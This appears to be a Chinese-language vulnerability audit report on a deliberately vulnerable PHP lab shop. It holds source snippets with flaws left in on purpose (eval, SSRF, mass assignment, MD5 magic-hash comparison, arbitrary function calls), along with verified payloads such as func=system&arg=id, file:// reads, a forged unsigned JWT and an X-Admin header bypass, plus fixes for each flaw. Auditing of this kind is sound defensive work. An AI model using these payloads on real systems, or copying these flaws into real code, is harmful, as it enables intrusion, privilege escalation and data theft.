- 评分依据：CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：使用白名单安全表达式解析器，禁止 eval；必要时仅允许数字与有限运算符。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/template-render.php:1-4`（sha256 `357da9e9959275d8…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$template=(string)($_POST['template']??'');$result='';
    3  if($_SERVER['REQUEST_METHOD']==='POST'){check_csrf();$result=preg_replace_callback('/\{\{(.*?)\}\}/s',function($m){return (string)eval('return '.$m[1].';');},$template);}
    4  page('营销内容排版',function()use($template,$result){echo '<section class="panel"><p>在双花括号内填写表达式，预览输出内容。</p><form method="post">'.csrf_field().'<label>模板<textarea name="template" required>'.h($template?:'本周精选，共 {{ 2 + 2 }} 款好物').'</textarea></label><button>生成预览</button></form><pre>'.h($result).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:33-40`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
   38  function csrf_token(): string { start_session(); return $_SESSION['csrf'] ??= bin2hex(random_bytes(24)); }
   39  function csrf_field(): string { return '<input type="hidden" name="csrf" value="' . h(csrf_token()) . '">'; }
   40  function check_csrf(): void { if (!hash_equals(csrf_token(), (string)($_POST['csrf'] ?? ''))) fail_request('页面已过期，请刷新后重试。', 403); }
```

### C-27 运营链接预览 file_get_contents 无协议/主机白名单导致 SSRF

- 当前版本：finding `452d174056004fbfad541168b5c7ae12` revision 1（项目版本 29）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/url-preview.php:3`；文件：`lab30-shop/app/public/ops/url-preview.php`
- 证据引用：`17e1cacfb5189678` lab30-shop/app/public/ops/url-preview.php:2-4；`6220461f4c36cb1a` lab30-shop/app/src/bootstrap.php:33-36
- 根因类别：task_goal:v2:90a5aa41203bf31262b7:1（规范类型 ssrf）

**结论陈述（模型产出，不是证据）**

ops/url-preview.php 第2行将 GET 参数 url 直接赋给 $url，第3行未做协议或主机校验即调用 file_get_contents($url,false,$context,0,65536)；stream_context 只设置 timeout=4 与 follow_location=0，不限制 http 之外协议或内网地址，攻击者可用 file:// 读取本地文件或访问内网服务。第3行取回的 $value 在第4行 <pre> 内以 h($output) 回显，读取结果直接返回给攻击者。第2行 require_user(['operator','admin']) 为必要账号前提。

- 攻击前身份与适用前提：攻击者持有 operator 或 admin 会话；PHP allow_url_fopen 开启（默认）；目标内网/本地资源可被应用进程访问
- 入口 → 传播 → 危险操作/状态变更：GET 参数 url → $_GET['url'] -> $url -> file_get_contents($url,false,$context,0,65536) -> $output -> 第4行 h($output) 回显 → file_get_contents 对用户可控 URL 发起服务端读取（支持多协议包装器）
- 防护与边界：stream_context 仅设置 timeout 与 follow_location=0；无协议白名单、无主机/IP 过滤、无解析后重定向校验；输出 h() 仅做 HTML 转义，不限制读取。
- 静态判读：缺上下文（2 项）；缺失上下文：运行时 allow_url_fopen 与 libxml 版本/外部实体加载配置未包含在快照，影响动态触发细节；服务器网络拓扑与内部服务可达性未知
- 动态验证：动态确认（verification `67ae0eeaf6aa46588d81a89ee709cf34`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧作业 11da55b9c90743d188e22a46d755bd04（operator，同会话）：url=file:///var/lib/shop/vault/internal.txt 返回 200，<pre> 为 'SHOP_INTERNAL_6ad05d571e8c0c338c3a243a\n'（MARKER True），说明可读本地文件；url=http://127.0.0.1/health.php 返回 200，<pre> 为 '{&quot;ok&quot;:true,&quot;version&quot;:&quot;1.0.0&quot;}'，即服务端向自身回环地址发起请求并带回内部健康接口响应（UNAVAILABLE 均为 False）。

- 评分依据：CVSS 3.1 待评分；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：将 URL 限制为 http/https 且使用 parse_url 校验 scheme/host；对解析后的主机做 DNS 解析并按 IP 拒绝私网、回环、链路本地与云元数据段；显式关闭 file/gopher/php 等包装器（或用 curl 仅允许 http/https）；如需内部预览应改用固定的允许列表前缀。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/url-preview.php:2-4`（sha256 `e495938b10c455c6…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$url=(string)($_GET['url']??'');$output='';
    3  if($url!==''){$context=stream_context_create(['http'=>['timeout'=>4,'follow_location'=>0]]);$value=@file_get_contents($url,false,$context,0,65536);$output=$value===false?'暂时无法获取该地址。':$value;}
    4  page('链接预览',function()use($url,$output){echo '<section class="panel"><form method="get">';form_input('url','内容地址',$url?:'http://fixtures:8080/catalog-info');echo '<button>读取预览</button></form><pre>'.h($output).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:33-36`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
```

### C-28 账户资料更新接口允许普通用户批量赋值修改 role/balance/tier 实现提权

- 当前版本：finding `63ebf68069984b988e79c6e29984e96c` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/account/update.php:5`；文件：`lab30-shop/app/public/account/update.php`
- 证据引用：`e22c7db798ad872d` lab30-shop/app/public/account/update.php:2-7；`5c7a19d86aca3057` lab30-shop/app/src/bootstrap.php:20-24；`78224482780bf94a` lab30-shop/app/src/bootstrap.php:33-37
- 根因类别：task_goal:v2:500aadd8b3d587f41b6d:1（规范类型 mass_assignment）

**结论陈述（模型产出，不是证据）**

account/update.php 在 POST 时定义 $columns=['display_name','email','role','balance','tier','nickname','homepage']，遍历 $_POST，凡键名命中即拼接为 `列`=?，最终执行 UPDATE users SET ... WHERE id=?，绑定值仅追加当前会话用户 $u['id']。因此任意已登录的普通用户只需提交 role=admin 或 balance=999999/tier=gold，即可把自身角色、余额、会员等级改成任意值，无需管理员权限或 CSRF 之外的其他条件（CSRF 令牌可从同一表单获取）。

- 攻击前身份与适用前提：攻击者拥有任意一个已登录账户；能够从 update.php 表单或 csrf_token() 获取有效 CSRF 令牌。
- 入口 → 传播 → 危险操作/状态变更：已登录用户的 POST 表单字段（键为 role/balance/tier 等，值为攻击者指定） → 未记录 → UPDATE users SET role=?,balance=?,tier=? ... WHERE id=当前用户
- 防护与边界：仅要求登录（require_user）与 CSRF 令牌（check_csrf），两者都不限制可写字段；$columns 白名单本身包含敏感列，未做角色授权。
- 静态判读：证据已记录
- 动态验证：动态确认（verification `a8ae9a9608804175844a18b4bba66fc8`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

作业 320134d524b3488bb5e5433aa903f667（alice 独立会话，登录后 /orders/index.php 200）：同样先 GET 表单取得 csrf（48 字符），再 POST csrf + display_name=Alice + role=admin + balance=999999 + tier=gold，请求返回 200，正文为 {"id":1,"username":"alice",...,"role":"admin","balance":"999999.00","tier":"gold",...}。独立读回 GET /account/index.php 返回 200 且页面显示 badge=gold、会员权益=金卡会员；GET /ops/index.php 返回 200（运营工作台标题），而该入口在导航中仅对 operator/admin 显示。宿主 postcondition 也记录 role customer→admin、balance 100.00→999999.00、tier standard→gold。仅通过表单暴露的 display_name/nickname/email/homepage 无法达成此效果。

- 评分依据：CVSS 3.1 Base 9.6 (critical) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：从 $columns 中移除 role、balance、tier 等敏感列，仅允许 display_name/email/nickname/homepage；如需管理员改角色，另设经角色校验的独立接口。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/account/update.php:2-7`（sha256 `b8227f19c05d0cd3…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();$notice='';
    3  if($_SERVER['REQUEST_METHOD']==='POST'){
    4      check_csrf();$columns=['display_name','email','role','balance','tier','nickname','homepage'];$set=[];$values=[];
    5      foreach($_POST as$key=>$value)if(in_array($key,$columns,true)){$set[]='`'.$key.'`=?';$values[]=(string)$value;}
    6      if(!$set)fail_request('没有可更新的资料。');$values[]=$u['id'];db()->prepare('UPDATE users SET '.implode(',',$set).' WHERE id=?')->execute($values);event_log('update_profile',['fields'=>array_keys($_POST)]);$notice='资料已保存。';$u=user();
    7      if(str_contains($_SERVER['HTTP_ACCEPT']??'','application/json'))json_response($u);
```

`lab30-shop/app/src/bootstrap.php:20-24`（sha256 `2050819d093be02b…`）

```php
   20  function user(): ?array {
   21      start_session();
   22      if (empty($_SESSION['user_id'])) return null;
   23      $q = db()->prepare('SELECT id,username,display_name,email,role,balance,tier,nickname,homepage FROM users WHERE id=?');
   24      $q->execute([$_SESSION['user_id']]); return $q->fetch() ?: null;
```

`lab30-shop/app/src/bootstrap.php:33-37`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
```

### C-29 注册入口 POST 状态变更未受 check_csrf 保护，可被跨站强制注册

- 当前版本：finding `bd815376f74949faa53e29011c3e66ac` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/auth/register.php:7`；文件：`lab30-shop/app/public/auth/register.php`
- 证据引用：`332e76d0afff47a7` lab30-shop/app/public/auth/register.php:4-10；`4eba9252f833f919` lab30-shop/app/src/bootstrap.php:38-40；`1db409b53daeba5e` lab30-shop/app/src/bootstrap.php:13-16
- 根因类别：task_goal:v2:2dbefb030e5136fcf317:1（规范类型 csrf）

**结论陈述（模型产出，不是证据）**

register.php 第 4 行进入 POST 分支后，第 7-8 行直接向 users 表插入新账号，全程未调用 bootstrap.php:40 提供的 check_csrf()，第 10 行渲染的注册表单也未包含 csrf_field() 生成的隐藏 token。因此第三方站点可用自动提交表单让已登录或未登录受害者的浏览器代其完成注册写入，形成跨站请求伪造。bootstrap.php:13 显式关闭 strict_mode 且会话 Cookie 为 SameSite=Lax，不能阻止顶层导航式跨站 POST 的场景之外也缺乏服务端 token 校验作为强制防护。

- 攻击前身份与适用前提：攻击者能诱导受害者浏览器向 /auth/register.php 提交 POST 表单；注册无需登录，受害者无需已认证即可被代注册（登录 CSRF 类）
- 入口 → 传播 → 危险操作/状态变更：跨站页面自动提交的 POST 表单字段 username/password/email → 外部表单 POST /auth/register.php -> 第4行 REQUEST_METHOD 判断 -> 第5行读取 $_POST -> 第6行格式校验 -> 第7-8行 prepare/execute 插入 users → INSERT INTO users 创建账户记录
- 防护与边界：bootstrap.php:40 存在 check_csrf()，但 register.php 未调用；表单无 csrf 隐藏字段；会话 Cookie SameSite=Lax 不是服务端强制校验，不能替代 token。
- 静态判读：缺上下文（2 项）；缺失上下文：login.php/continue.php 对 start_session 的 SID 传参未在本单元读取；users 表约束与 role/balance 列定义未读取
- 动态验证：动态确认（verification `c789bec81d2343d0a60aceaff664f286`）
- 正式终审：独立批次 fb1957b0958c4713a36041c7dee037f9；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

guest 向注册入口提交无 CSRF 令牌的普通表单字段，ATTACK_STATUS 200 且注册成功；另建 cookie jar 使用所建凭据登录，账户页读回用户名和邮箱均存在。

- 评分依据：CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：在 register.php 第 4 行 POST 分支起始处调用 check_csrf()，并在第 10 行表单中加入 csrf_field() 输出隐藏 token。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/auth/register.php:4-10`（sha256 `99166a0288be7b1e…`）

```php
    4  if($_SERVER['REQUEST_METHOD']==='POST') {
    5      $name=(string)($_POST['username']??''); $password=(string)($_POST['password']??'');
    6      if(!preg_match('/^[a-zA-Z][a-zA-Z0-9_]{2,39}$/D',$name)||strlen($password)<8) fail_request('用户名需为 3–40 位字母数字，密码至少 8 位。');
    7      $q=db()->prepare('INSERT INTO users(username,password_md5,display_name,email,role,balance,tier,nickname) VALUES(?,?,?,?,?,100,?,?)');
    8      try {$q->execute([$name,md5($password),$name,(string)($_POST['email']??''),'customer','standard',$name]); $notice='注册成功，现在可以登录。';} catch(PDOException $e) {fail_request('该用户名已注册。',409);}
    9  }
   10  page('创建账户',function()use($notice){echo '<section class="panel narrow">';if($notice)echo '<div class="notice">'.h($notice).'</div>';echo '<form method="post">';form_input('username','用户名');form_input('email','邮箱','','email');form_input('password','密码（至少 8 位）','','password');echo '<button>注册账户</button></form><a href="/auth/login.php">已有账户，去登录</a></section>';});
```

`lab30-shop/app/src/bootstrap.php:38-40`（sha256 `2050819d093be02b…`）

```php
   38  function csrf_token(): string { start_session(); return $_SESSION['csrf'] ??= bin2hex(random_bytes(24)); }
   39  function csrf_field(): string { return '<input type="hidden" name="csrf" value="' . h(csrf_token()) . '">'; }
   40  function check_csrf(): void { if (!hash_equals(csrf_token(), (string)($_POST['csrf'] ?? ''))) fail_request('页面已过期，请刷新后重试。', 403); }
```

`lab30-shop/app/src/bootstrap.php:13-16`（sha256 `2050819d093be02b…`）

```php
   13      ini_set('session.use_strict_mode', '0');
   14      session_save_path(data_dir() . '/sessions');
   15      session_name('SHOPSESSID');
   16      session_set_cookie_params(['httponly' => true, 'samesite' => 'Lax', 'path' => '/']);
```

### C-30 兑换码弱类型比较可用魔术哈希绕过并免费升级金卡会员

- 当前版本：finding `0e67c5ccc77e46d4b7f37847b81b9827` revision 1（项目版本 2）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/account/redeem.php:5`；文件：`lab30-shop/app/public/account/redeem.php`
- 证据引用：`b48ee34852bb1a8a` lab30-shop/app/public/account/redeem.php:4-5；`429211e3a8985b43` lab30-shop/app/public/account/redeem.php:9-9；`415907ec6bf2f739` lab30-shop/app/src/bootstrap.php:40-40
- 根因类别：task_goal:v2:b91bfb5c712f00f2b6bb:1（规范类型 weak_type_comparison）

**结论陈述（模型产出，不是证据）**

redeem.php 第4行将固定兑换码 md5('240610708') 作为期望哈希，第5行用 PHP 松散比较 == 对比用户提交 token 的 md5 值。'240610708' 的 md5 为以 0e 开头的纯数字串，任何 md5 摘要同样为 0e+数字 的输入（如 'QNKCDZO'）在 == 下被判定相等，导致未经真实兑换码即执行 UPDATE users SET tier='gold'。虽存在 CSRF 校验与登录前提，但不能阻止已登录攻击者绕过兑换码校验。

- 攻击前身份与适用前提：攻击者拥有已登录账户并能获取有效 CSRF 令牌；POST 方法。
- 入口 → 传播 → 危险操作/状态变更：POST token 参数 → token -> md5() -> == $secret_hash -> UPDATE users tier='gold' → 弱比较通过后执行数据库 UPDATE 提升用户 tier 为 gold
- 防护与边界：有 check_csrf() 和 require_user() 登录前提，但哈希比较未使用 hash_equals/===。
- 静态判读：证据已记录
- 动态验证：动态确认（verification `14c03c4e4ff948d9bda1db2dd48ee0b7`）
- 正式终审：独立批次 018d854b88194746aff34ba0f75a282f；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧作业 bbd750d248b244379ee1e17865b1ff74（alice，新会话）：BEFORE_ATTACK_INDEX 为 ('standard','普通会员…')；提交 token=QNKCDZO（md5=0e830400451993494058024219903391）并带 48 位 csrf，ATTACK_TOKEN_STATUS 200、ATTACK_SUCCESS_NOTICE True、ATTACK_INVALID_NOTICE False；AFTER_ATTACK_INDEX 200 变为 ('gold','金卡会员：享受专属折扣与优先服务')，ATTACK_TIER_GOLD True。与真实码 md5('240610708')=0e462097431906509019562988736854 相比，二者均为 0e 开头的纯数字串，说明是松散比较把两个不同摘要判等，而非提交了真实兑换码。随后用攻击前导出的合法备份恢复，AFTER_RESTORE_INDEX 回到 ('standard','普通会员…')。

- 评分依据：CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：使用 hash_equals($secret_hash, md5((string)($_POST['token']??''))) 或 === 严格比较，且不要把哈希作为可猜测的秘密；改为服务端存储一次性兑换码并使用严格比较。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/account/redeem.php:4-5`（sha256 `28b3dc4534cca985…`）

```php
    4      check_csrf();$secret_hash=md5('240610708');
    5      if(md5((string)($_POST['token']??''))==$secret_hash){db()->prepare("UPDATE users SET tier='gold' WHERE id=?")->execute([$u['id']]);event_log('redeem_membership');$notice='兑换成功，已升级金卡会员。';$accepted=true;}
```

`lab30-shop/app/public/account/redeem.php:9-9`（sha256 `28b3dc4534cca985…`）

```php
    9  page('会员权益兑换',function()use($notice){echo '<section class="panel narrow"><h2>让日常多一点惊喜</h2><p>输入活动提供的会员兑换码。</p>';if($notice)echo '<div class="notice">'.h($notice).'</div>';echo '<form method="post">'.csrf_field();form_input('token','兑换码');echo '<button>兑换权益</button></form></section>';},'账户与会员');
```

`lab30-shop/app/src/bootstrap.php:40-40`（sha256 `2050819d093be02b…`）

```php
   40  function check_csrf(): void { if (!hash_equals(csrf_token(), (string)($_POST['csrf'] ?? ''))) fail_request('页面已过期，请刷新后重试。', 403); }
```

### C-31 ops/formula.php 将 $_GET['func'] 直接作为函数名动态调用，可调用 system 等实现任意代码/命令执行

- 当前版本：finding `eadd0beed2c0463888586e26fe9ddf33` revision 1（项目版本 19）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/formula.php:3`；文件：`lab30-shop/app/public/ops/formula.php`
- 证据引用：`f3b7c0b40a3232d5` lab30-shop/app/public/ops/formula.php:1-4；`78224482780bf94a` lab30-shop/app/src/bootstrap.php:33-37
- 根因类别：task_goal:v2:a8d8c05218b3b1274fc9:1（规范类型 code_execution）

**结论陈述（模型产出，不是证据）**

formula.php 第3行从 $_GET['func'] 取任意字符串并直接作为可调用函数执行，仅受 require_user 的 operator/admin 角色限制，无函数名白名单。攻击者可传 func=system&arg=id 让服务端执行系统命令，或调用其它危险内置函数。bootstrap.php:33-37 的角色校验不构成对函数名的约束。

- 攻击前身份与适用前提：已登录 operator 或 admin 角色账号；服务端未禁用相关函数
- 入口 → 传播 → 危险操作/状态变更：HTTP GET 参数 func 与 arg → $_GET['func'] -> $func（第3行）-> 动态函数调用 $func($arg) → $func((string)($_GET['arg']??'')) 以用户可控函数名动态调用
- 防护与边界：仅有 require_user(['operator','admin']) 角色校验（bootstrap.php:33-37），未对 func 做白名单/正则限制；h() 只作用于输出回显，不影响调用
- 静态判读：缺上下文（1 项）；缺失上下文：未读取 ops/template-preview.php 源码（本工作项未预载），其 include 风险仅由既有 finding 覆盖，未在本轮复核。
- 动态验证：动态确认（verification `021f467f32174afb86ef6bc7c58caf94`）
- 正式终审：独立批次 fb1957b0958c4713a36041c7dee037f9；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

作业 fad4a899868e4cb5b24ebb4a00eccc94（operator，GET /ops/formula.php?func=system&arg=id）返回 200，响应正文开头即为 "uid=33(www-data) gid=33(www-data) groups=33(www-data)"，且 <pre> 中回显同样内容，证明 func 参数被当作真实函数名执行、arg 被作为 system 的命令串执行。作业 eff3957497b84f63a11c84400ce65348（operator，func=shell_exec&arg=id）同样在 <pre> 中回显 "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"，构成第二类危险函数可调用的独立观测。两次均为 operator 会话实际提交，非管理员会话结果。

- 评分依据：CVSS 3.1 Base 8.3 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：移除用户可控函数名调用；如确需多种计算，改用固定的函数映射表（白名单），拒绝表外输入。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/formula.php:1-4`（sha256 `686f39f31996a5d3…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$result='';
    3  if(isset($_GET['func'])){$func=(string)$_GET['func'];$result=(string)$func((string)($_GET['arg']??''));}
    4  page('运营公式计算',function()use($result){echo '<section class="panel"><p>选择函数并提交文本进行试算。</p><form method="get">';form_input('func','函数名称','strtoupper');form_input('arg','输入值','spring-sale');echo '<button>执行计算</button></form><pre>'.h($result).'</pre></section>';},'运营工作台');
```

`lab30-shop/app/src/bootstrap.php:33-37`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
```

## 5. 实际验证和终审理由

### C-01 合作方结算门户仅解码 JWT 载荷不验签，任意用户伪造 role=admin 即可越权读取全部订单结算数据

- verification `f29bc4902fbb4b4c9b565c8cabfaf31f`（finding `9f5d703b4b6f446ca5a3f2b7b6e61942` revision 1，context `63ff904287fc462d8d20069bd46f0c06`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：guest 身份 GET /partner/portal.php（无令牌）：HTTP 403，页面提示“此合作方功能仅向管理员开放。”（job 5858e2d3d5c34f1fa68fb75d68eb2bad，body 与 headers 已引用）。攻击脚本内的正常侧同样为 NORMAL_TOKEN_STATUS 403、error 文案一致。
  - 攻击侧观测：guest 身份向 /partner/portal.php 提交 Accept: application/json 与 token=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAxLCAicm9sZSI6ICJhZG1pbiIsICJuYW1lIjogIngifQ.forgedsig（载荷 {"sub":1,"role":"admin","name":"x"}，签名为不可验证的 ".forgedsig"）：HTTP 200，响应体 {"role":"admin","settlements":[{"order_no":"SG-1001","total":"129.00"},{"order_no":"SG-1002","total":"158.00"}]}，HAS_SETTLEMENTS True（job 1701fb143b564fa99f0cdbc7ccb91e0d，exit 0）。同一脚本先以 NORMAL_TOKEN_STATUS 403 建立对照，唯一变化仅为 token 载荷与签名。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `116dc6f83d674456b9c3f969a96971f1`；本次未重新执行该历史作业。
  - 已保存作业事实：3 个；满足执行及前提检查的作业：3 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`d44cf43c5f1d407f96bbbf7103d35e3d`；`5858e2d3d5c34f1fa68fb75d68eb2bad`；`1701fb143b564fa99f0cdbc7ccb91e0d`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`5858e2d3d5c34f1fa68fb75d68eb2bad` http finished exit=0；`1701fb143b564fa99f0cdbc7ccb91e0d` script finished exit=0
  - 适配脚本：`f29bc490-adapted-partner_portal_jwt_bypass.py`（见证据包 evidence/）
  - 备注：攻击侧作业 1701fb143b564fa99f0cdbc7ccb91e0d 与正常侧 5858e2d3d5c34f1fa68fb75d68eb2bad 均为 guest 身份、同一上下文，作业 precondition ok=true。另有一份宿主审计的 alice 身份独立复现作业 d44cf43c5f1d407f96bbbf7103d35e3d（正常 403 / 攻击 200 且结算一致），因攻击身份必须与作业一致，未计入本 experiment 的 normal_job_ids/attack_job_ids，仅作旁证。

- 正式复核 `7f4f4e8e5639445191c4b27453374030`：复核确认；引用 revision 1 / verification `f29bc4902fbb4b4c9b565c8cabfaf31f`
  - 理由：正常侧 guest 无令牌 GET /partner/portal.php 返回 403 与“此合作方功能仅向管理员开放。”，脚本内 NORMAL_TOKEN_STATUS 亦为 403；攻击侧同一 guest 提交 payload {"sub":1,"role":"admin","name":"x"}、签名 .forgedsig 的 JWT 后 HTTP 200，响应体含 settlements SG-1001 129.00 与 SG-1002 158.00，HAS_SETTLEMENTS True，唯一变化为 token 变量。与 portal.php:2-5 未验签、仅采信 role 声明的静态结论一致，动态确认越权读取成立。限制为仅读路径，未覆盖写操作与算法变体，不影响本结论。
  - 复核观测：正常侧 guest 身份 GET /partner/portal.php（无令牌）：HTTP 403，页面提示“此合作方功能仅向管理员开放。”（job 5858e2d3d5c34f1fa68fb75d68eb2bad，body 与 headers 已引用）。攻击脚本内的正常侧同样为 NORMAL_TOKEN_STATUS 403、error 文案一致。；攻击侧 guest 身份向 /partner/portal.php 提交 Accept: application/json 与 token=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAxLCAicm9sZSI6ICJhZG1pbiIsICJuYW1lIjogIngifQ.forgedsig（载荷 {"sub":1,"role":"admin","name":"x"}，签名为不可验证的 ".forgedsig"）：HTTP 200，响应体 {"role":"admin","settlements":[{"order_no":"SG-1001","total":"129.00"},{"order_no":"SG-1002","total":"158.00"}]}，HAS_SETTLEMENTS True（job 1701fb143b564fa…

### C-02 ops/maintenance.php 仅凭客户端 X-Admin 请求头判定服务身份，未登录即可触发维护写操作

- verification `9dbb3f4e59ad43e585967b1e0ea6b5f2`（finding `e2cf827251824b459229883c352560e6` revision 1，context `d16fb6ceed5a48f89297cc7476d9d456`，target lab30-shop-1.0.0）
  - 执行状态：验证实验因模型或运行时异常中断，已保存作业，结论仍未决；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `270b010e39c141bea1ef1bded14e9ea1`；本次未重新执行该历史作业。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 结论未完整发布；缺少正常／攻击侧发布内容不代表没有执行观测。
  - 已观测作业 ID：`e788ff25235143cf8519613049814cff`；`02b88e42736b40a9b9df80f83b474c2d`
  - 结论结束原因：sdk_api_error；执行阶段结束原因：sdk_api_error
  - 作业：`e788ff25235143cf8519613049814cff` script finished exit=0；`02b88e42736b40a9b9df80f83b474c2d` script finished exit=0

- verification `a219875bf5a0430db6b8adfc53d58758`（finding `e2cf827251824b459229883c352560e6` revision 1，context `56063c457bf646e4be8febaf1476c15d`，target lab30-shop-1.0.0）
  - 执行状态：验证实验因模型或运行时异常中断，已保存作业，结论仍未决；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `6ce22ace1eb840389e200631d05937ab`；本次未重新执行该历史作业。
  - 结论结束原因：sdk_api_error；执行阶段结束原因：sdk_api_error

- verification `a468cb45d03e41b18312135b4b3440c3`（finding `e2cf827251824b459229883c352560e6` revision 1，context `cf900ac789dd4dcbb8e9e3cd3a967098`，target lab30-shop-1.0.0）
  - 执行状态：未执行；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `05ac5eea78b94942b7ab9c0e8ffafab5`；本次未重新执行该历史作业。
  - 结论结束原因：stream_connection_error；执行阶段结束原因：未记录

- verification `321c1c5ebdfa4b6eb8458025e6c452b4`（finding `e2cf827251824b459229883c352560e6` revision 1，context `66187edf82894894a4f22b5d31fe097f`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：guest（无 CookieJar，先访问 /orders/index.php 得 401 证明无会话）：GET /ops/maintenance.php 无头 → 403 页面“内部维护接口需要有效的服务身份。”；POST 无头 → 403。基线 operator GET /ops/jobs.php（200）近期任务表只有 385 &#124; 日常库存同步 &#124; completed。
  - 攻击侧观测：同一无会话 guest 仅添加请求头 X-Admin: 1：GET /ops/maintenance.php → 200 {"service":"settlement-maintenance","authorized":true}；POST → 200 {"accepted":true,"job_id":386}。随后 operator GET /ops/jobs.php（200）读回：386 &#124; 系统对账 &#124; queued &#124; 维护接口发起（385 仍在下方），确认攻击变量造成了新的持久化任务记录。
  - 继承验证：原运行 `566a1c802c1e5ef19b153cb5529b1446` / verification `a9f281c9c5264daabe6d7eeb03fc5242`；本次未重新执行该历史作业。
  - 已保存作业事实：3 个；满足执行及前提检查的作业：3 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`5d660e2e14634c86ba712f86ca532277`；`9ed28a61914d4f6eaf350fdda77bca4f`；`897f55b7da3047f9ab3e307f54e7fad4`
  - 结论结束原因：completed；执行阶段结束原因：sdk_interrupt_error
  - 作业：`5d660e2e14634c86ba712f86ca532277` http finished exit=0；`9ed28a61914d4f6eaf350fdda77bca4f` script finished exit=0；`897f55b7da3047f9ab3e307f54e7fad4` http finished exit=0
  - 适配脚本：`321c1c5e-adapted-poc.php`（见证据包 evidence/）
  - 备注：源码快照 applicability=match：maintenance.php:3 使用 ($_SERVER['HTTP_X_ADMIN']??'')!=='1' 后直接 fail_request；:4 POST 分支执行 INSERT INTO jobs(user_id,title,status,details) VALUES(4,?,'queued','维护接口发起')；bootstrap.php:33-37 的 require_user() 未被该入口调用。正常/攻击两侧均来自本上下文成功作业；写回由独立 operator 会话读取 /ops/jobs.php 验证。服务端诊断对该 HTTP 作业为 capability_unavailable，未用于结论。

